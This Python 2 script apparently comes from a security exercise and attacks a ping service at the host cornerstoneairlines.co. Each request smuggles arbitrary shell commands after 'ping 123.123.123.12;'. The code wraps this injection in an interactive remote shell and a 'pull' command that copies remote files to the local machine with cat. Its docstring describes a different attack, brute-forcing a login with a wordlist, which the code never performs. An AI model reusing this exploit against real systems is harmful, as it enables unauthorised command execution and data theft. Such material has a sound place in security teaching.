

"""
    Sockets: https://docs.python.org/2/library/socket.html
    How to use the socket s:

        # Establish socket connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        Reading:

            data = s.recv(1024)     # Receives 1024 bytes from IP/Port
            print(data)             # Prints data

        Sending:

            s.send("something to send\n")   # Send a newline \n at the end of your command

    General idea:

        Given that you know a potential username, use a wordlist and iterate
        through each possible password and repeatedly attempt to login to
        the Briong server.
"""

import socket, time

def execute_cmd():


    while 1:
        host = "cornerstoneairlines.co" # IP address here
        port = 45 # Port here
        user_input = raw_input("> ")

        if user_input == "shell":
            path = "/"

            while 1:
                user_input = raw_input(path + "> ")
                if user_input == "exit":
                    break

                command = "ping 123.123.123.12; cd " + path + "; " + user_input + "\n"
                user_array = user_input.split(" ")
                if user_array[0] == "cd":
                    if len(user_array) == 1:
                        path = "/"
                    elif len(user_array) == 2:
                        path += user_array[1]
                    else:
                        print("Invalid command.\n")
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                trash_data = s.recv(1024)
                time.sleep(2)
                s.send(command)
                time.sleep(2)
                data = s.recv(1024)
                print(data.strip())
                s.close()
        elif user_input.split(" ")[0] == "pull":
            input_array = user_input.split(" ")
            if (len(input_array) == 3):
                remote_path = input_array[1]
                local_path = input_array[2]
                command = "ping 123.123.123.12; cat " + remote_path + "\n"
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                trash_data = s.recv(1024)
                time.sleep(2)
                s.send(command)
                time.sleep(2)
                data = s.recv(1024)
                f = open(local_path, "w")
                f.write(data.strip())
                f.close()
                s.close()
        elif user_input == "help":
            print("shell Drop into an interactive shell and allow users to gracefully exit\n\
pull <remote-path> <local-path> Download files\nhelp Shows this help menu\nquit Quit the shell.")
        elif user_input == "quit":
            break
        else:
            print("Invalid command.\n")

if __name__ == '__main__':
    execute_cmd()
